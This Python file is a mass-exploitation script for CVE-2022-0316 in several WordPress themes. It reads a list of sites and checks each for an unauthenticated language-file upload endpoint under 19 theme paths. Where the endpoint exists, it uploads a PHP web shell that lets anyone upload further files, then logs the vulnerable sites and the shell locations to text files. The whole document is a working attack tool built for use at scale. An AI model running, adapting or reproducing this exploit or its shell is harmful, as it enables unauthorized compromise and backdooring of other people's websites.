# !/usr/bin/env python3
# -*- coding: utf-8 -*
from argparse import ArgumentParser
from random import getrandbits
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from requests import Session

__import__('warnings').simplefilter('ignore', Warning)


class CVE_2022_0316:

    def Save(self, file, data):
        with self.Lock:
            with open(file, 'a') as f:
                f.write(f"{data}\n")

    def Exploit(self, url):
        name = f"{getrandbits(32)}.php"
        r = self.session.post(url, files={"mofile[]": (name, self.shell)}).text
        if "New Language Uploaded Successfully" in r:
            print(f" [ LOG ] (SHELL UPLOADED) {url}")
            self.Save("__shells__.txt", url.replace("include/lang_upload.php", f"languages/{name}"))
            return 1
        print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")

    def Scan(self, url):
        url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"
        print(f" [ LOG ] (CHECKING) {url}")
        try:
            for path in self.paths:
                r = self.session.get(f"{url}wp-content/themes/{path}/include/lang_upload.php").text
                if 'Please select Mo file' in r:
                    url = f"{url}wp-content/themes/{path}/include/lang_upload.php"
                    print(f" [ LOG ] (VULN) {url}")
                    self.Save("__vuln__.txt", url)
                    return self.Exploit(url)
                print(f" [ LOG ] (NOT VULN) {url}")
        except:
            print(f" [LOG] EXCEPTION ERROR ({url})")

    def __init__(self, Lock):
        self.Lock = Lock
        self.paths = ["westand", "footysquare", "aidreform", "statfort", "club-theme",
                      "kingclub-theme", "spikes", "spikes-black", "soundblast",
                      "bolster", "rocky-theme", "bolster-theme", "theme-deejay",
                      "snapture", "onelife", "churchlife", "soccer-theme",
                      "faith-theme", "statfort-new"]
        self.shell = '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''
        self.session = Session()
        self.session.verify = False
        self.session.timeout = (20, 40)
        self.session.allow_redirects = True
        self.session.max_redirects = 5
        self.session.headers.update({
                                        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"})


if __name__ == '__main__':
    print('''


    db   d8b   db d8888b.      d88888b db    db d8888b. 
    88   I8I   88 88  `8D      88'     `8b  d8' 88  `8D 
    88   I8I   88 88oodD'      88ooooo  `8bd8'  88oodD' 
    Y8   I8I   88 88~~~        88~~~~~  .dPYb.  88~~~   
    `8b d8'8b d8' 88           88.     .8P  Y8. 88      
     `8b8' `8d8'  88           Y88888P YP    YP 88      
                                                KTN

        ''')

    parser = ArgumentParser()
    parser.add_argument('-l', '--list', help="Path of list site", required=True)
    parser.add_argument('-t', '--threads', type=int, help="threads number", default=100)
    args = parser.parse_args()
    try:
        with open(args.list, 'r') as f:
            urls = list(set(f.read().splitlines()))
        ExpObj = CVE_2022_0316(Lock())
        with ThreadPoolExecutor(max_workers=int(args.threads)) as pool:
            [pool.submit(ExpObj.Scan, url) for url in urls]
    except Exception as e:
        print(e)
        print(" [LOG] EXCEPTION ERROR @ MAIN FUNC")
